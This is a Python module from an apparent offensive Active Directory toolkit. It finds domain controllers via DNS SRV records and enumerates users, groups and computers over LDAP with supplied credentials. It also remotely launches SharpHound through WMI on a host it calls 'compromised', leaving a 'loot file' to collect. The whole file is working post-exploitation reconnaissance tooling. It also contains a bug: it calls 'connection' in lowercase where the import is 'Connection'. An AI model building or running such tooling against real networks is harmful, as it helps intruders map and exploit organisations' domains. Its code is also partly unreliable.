import ssl
import os
from datetime import datetime
from ldap3 import Server, Connection, NTLM, ALL
from ldap3.core.exceptions import LDAPBindError
from modules import execution

try:
    import dns.resolver
except ImportError:
    print("[!] Module 'dnspython' not found. Please run 'pip install -r requirements.txt'")
    exit()

def _create_ldap_connection(target_ip, domain, username, password):
    server_uri = f"ldap://{target_ip}"
    server = Server(server_uri, get_info=ALL)
    user_dn = f'{domain}\\{username}'   
    try:
        connect  = connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)
        print(f"[+] LDAP Bind Successful to {target_ip}")
        return connect 
    except LDAPBindError as e:
        print(f"[!] LDAP Bind Failed: {e}")
        return None
    except Exception as e:
        print(f"[!] An unexpected error occurred during LDAP connection: {e}")
        return None

def find_dc_ip(domain):
    print(f"\n[+] Hunting for a Domain Controller for '{domain}' via DNS...")
    srv_record = f'_ldap._tcp.dc._msdcs.{domain}'
    try:
        answers = dns.resolver.resolve(srv_record, 'SRV')
        hostname = str(answers[0].target).rstrip('.')
        print(f"[*] Found DC hostname: {hostname}. Now resolving its IP.")
        ip_answers = dns.resolver.resolve(hostname, 'A')
        dc_ip = str(ip_answers[0])
        print(f"[+] Success! Resolved DC IP: {dc_ip}")
        return dc_ip
    except Exception as e:
        print(f"[!] DNS resolution failed. Can't find the DC. Error: {e}")
        return None

def run():
    while True:
        print("\n--- Enumeration & Situational Awareness ---")
        print("1. Find Domain Controller")
        print("2. Enumerate Domain Users")
        print("3. Enumerate Domain Groups")
        print("4. Enumerate Domain Computers")
        print("5. Run SharpHound (BloodHound Collector)")
        print("99. Return to Main Menu")

        choice = input("Enter your choice: ")

        if choice == '1':
            domain = input("Enter Target Domain (e.g., contoso.local): ")
            find_dc_ip(domain)
            input("\nPress Enter to continue...")
        elif choice in ['2', '3', '4']:
            domain = input("Enter Target Domain (e.g., contoso.local): ")
            target_ip = find_dc_ip(domain)
            if not target_ip:
                print("[!] Could not proceed without a Domain Controller IP.")
                input("\nPress Enter to continue...")
                continue
            print("[*] Got the DC IP. Now need credentials to talk to it.")
            username = input("Enter Username: ")
            password = input("Enter Password: ")
            
            connect = _create_ldap_connection(target_ip, domain, username, password)
            if not connect:
                input("\nPress Enter to continue...")
                continue
            # This is important. We need the Base DN to search from the root of the domain.
            # The server info gives it to us so we don't have to guess.
            base_dn = connect.server.info.other['defaultNamingContext'][0]
            print(f"[*] Search Base DN set to: {base_dn}")
            
            if choice == '2':
                enumerate_users(connect, base_dn)
            elif choice == '3':
                enumerate_groups(connect, base_dn)
            elif choice == '4':
                enumerate_computers(connect, base_dn)
            connect.unbind()
        elif choice == '5':
            run_sharphound()
        elif choice == '99':
            print("Returning to main menu...")
            return
        else:
            print("Invalid choice. Please try again.")
            input("Press Enter to continue...")

def run_sharphound():
    print("\n[+] SharpHound Execution Workflow")
    print("[!] This requires you to have a foothold on a domain-joined machine.")
    print("[!] You must also have uploaded SharpHound.exe to that machine (e.g., to C:\\temp\\SharpHound.exe).")
    
    domain = input("Enter Target Domain: ")
    target_ip = input("Enter IP of compromised host (to run SharpHound FROM): ")
    username = input("Enter Username (with admin rights on compromised host): ")
    password = input("Enter Password: ")
    
    sharphound_path = input("Enter the full path to SharpHound.exe on the target machine: ")
    command_to_run = f"{sharphound_path} -c All -d {domain}"
    
    print("\n[*] Preparing to execute SharpHound...")
    if execution.wmi_exec(target_ip, domain, username, password, command_to_run):
        print("\n[+] SharpHound execution command sent successfully.")
        print("[*] The BloodHound loot file should now be on the compromised host.")
        print("[*] You will need to retrieve it manually (e.g., via an SMB share).")
    else:
        print("\n[-] Failed to execute SharpHound.")
    
    input("\nPress Enter to continue...")

def enumerate_users(connect, base_dn):
    print("\n[+] Querying for all user accounts...")
    search_filter = '(objectClass=person)'
    attributes = ['sAMAccountName']#in search filter what we need
    
    try:
        connect.search(search_base=base_dn,
                    search_filter=search_filter,
                    attributes=attributes)
        
        if connect.entries:
            print("\n[+] Found Users:")
            print("-" * 20)
            for entry in connect.entries:
                print(entry.sAMAccountName)
            print("-" * 20)
        else:
            print("[-] No user accounts found with that query.")

    except Exception as e:
        print(f"\n[!] An error occurred during user search: {e}")
    input("\nPress Enter to continue...")

def enumerate_groups(connect, base_dn):
    print("\n[+] Querying for all domain groups...")
    search_filter = '(objectClass=group)'
    attributes = ['cn'] # 'cn' is the common name for groups

    try:
        connect.search(search_base=base_dn,
                    search_filter=search_filter,
                    attributes=attributes)

        if connect.entries:
            print("\n[+] Found Groups:")
            print("-" * 40)
            for entry in connect.entries:
                print(entry.cn)
            print("-" * 40)
        else:
            print("[-] No groups found with that query.")
        
    except Exception as e:
        print(f"\n[!] An error occurred during group search: {e}")
    input("\nPress Enter to continue...")

def enumerate_computers(connect, base_dn):
    print("\n[+] Querying for all computer accounts...")
    search_filter = '(objectCategory=computer)'
    attributes = ['dNSHostName']

    try:
        connect.search(search_base=base_dn, search_filter=search_filter, attributes=attributes)
        if  connect.entries:
            print("\n[+] Found Computers:")
            print("-" * 40)
            for entry in    connect.entries:
                if 'dNSHostName' in entry:
                    print(entry.dNSHostName)
            print("-" * 40)
        else:
            print("[-] No computer accounts found with that query.")
    except Exception as e:
        print(f"\n[!] An error occurred during computer search: {e}")
    input("\nPress Enter to continue...")
